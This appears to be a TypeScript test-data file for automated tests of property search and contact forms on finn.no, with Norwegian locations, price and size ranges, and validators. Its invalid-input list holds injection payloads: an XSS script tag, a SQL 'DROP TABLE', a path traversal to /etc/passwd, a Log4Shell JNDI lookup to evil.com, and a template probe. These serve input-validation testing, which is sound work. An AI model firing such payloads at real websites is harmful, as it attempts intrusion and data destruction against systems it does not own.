export interface SearchTestData {
  locations: string[];
  priceRanges: PriceRange[];
  propertySizes: SizeRange[];
  propertyTypes: PropertyType[];
}

export interface InvalidSearchData {
  invalidPrices: string[];
  invalidSizes: string[];
  emptyLocation: string;
  specialCharacters: string[];
}

export interface ExpectedErrors {
  invalidPrice: string;
  invalidSize: string;
  noResults: string;
}

export interface PriceRange {
  from: string;
  to: string;
  description?: string;
}

export interface SizeRange {
  from: string;
  to: string;
  description?: string;
}

export interface PropertyType {
  value: string;
  label: string;
}

export interface TestContactData {
  name: string;
  email: string;
  phone: string;
  message: string;
}

export interface TestEnvironment {
  baseUrl: string;
  timeout: number;
  retries: number;
}

export const validSearchData: SearchTestData = {
  locations: [
    'Oslo',
    'Bergen',
    'Trondheim',
    'Stavanger',
    'Kristiansand',
    'Tromsø',
    'Drammen',
    'Fredrikstad',
  ],
  priceRanges: [
    { from: '2000000', to: '4000000', description: 'Entry level' },
    { from: '4000000', to: '6000000', description: 'Mid-range' },
    { from: '6000000', to: '10000000', description: 'Premium' },
    { from: '10000000', to: '20000000', description: 'Luxury' },
  ],
  propertySizes: [
    { from: '30', to: '60', description: 'Small apartment' },
    { from: '60', to: '100', description: 'Medium apartment' },
    { from: '100', to: '150', description: 'Large apartment' },
    { from: '150', to: '300', description: 'House/Villa' },
  ],
  propertyTypes: [
    { value: 'Leilighet', label: 'Apartment' },
    { value: 'Enebolig', label: 'House' },
    { value: 'Rekkehus', label: 'Townhouse' },
    { value: 'Tomannsbolig', label: 'Duplex' },
    { value: 'Hytte', label: 'Cabin' },
  ],
};

export const invalidSearchData: InvalidSearchData = {
  invalidPrices: ['-1000', 'abc', '999999999999', '0', ' ', '1000000000000000'],
  invalidSizes: ['-50', '0', 'xyz', '10000', ' ', 'abc123'],
  emptyLocation: '',
  specialCharacters: [
    '!@#$%^&*()',
    "<script>alert('xss')</script>",
    "'; DROP TABLE properties;--",
    '../../etc/passwd',
    '${jndi:ldap://evil.com}',
    '{{7*7}}',
  ],
};

export const expectedErrors: ExpectedErrors = {
  invalidPrice: 'Ugyldig prisområde',
  invalidSize: 'Ugyldig størrelse',
  noResults: 'Ingen treff',
};

export const testContactData: TestContactData = {
  name: 'Test Bruker',
  email: 'test@example.com',
  phone: '98765432',
  message: 'Jeg er interessert i denne eiendommen. Kan dere kontakte meg?',
};

export const testEnvironment: TestEnvironment = {
  baseUrl: 'https://www.finn.no',
  timeout: 30000,
  retries: 2,
};

// Helper functions for test data
export function getRandomLocation(): string {
  return validSearchData.locations[Math.floor(Math.random() * validSearchData.locations.length)];
}

export function getRandomPriceRange(): PriceRange {
  return validSearchData.priceRanges[
    Math.floor(Math.random() * validSearchData.priceRanges.length)
  ];
}

export function getRandomSizeRange(): SizeRange {
  return validSearchData.propertySizes[
    Math.floor(Math.random() * validSearchData.propertySizes.length)
  ];
}

export function getRandomPropertyType(): PropertyType {
  return validSearchData.propertyTypes[
    Math.floor(Math.random() * validSearchData.propertyTypes.length)
  ];
}

// Validation functions
export function isValidPriceRange(from: string, to: string): boolean {
  const fromNum = parseInt(from);
  const toNum = parseInt(to);
  return !isNaN(fromNum) && !isNaN(toNum) && fromNum > 0 && toNum > fromNum && toNum <= 100000000;
}

export function isValidSizeRange(from: string, to: string): boolean {
  const fromNum = parseInt(from);
  const toNum = parseInt(to);
  return !isNaN(fromNum) && !isNaN(toNum) && fromNum > 0 && toNum > fromNum && toNum <= 1000;
}

export function isValidLocation(location: string): boolean {
  return location.length > 0 && !invalidSearchData.specialCharacters.includes(location);
}
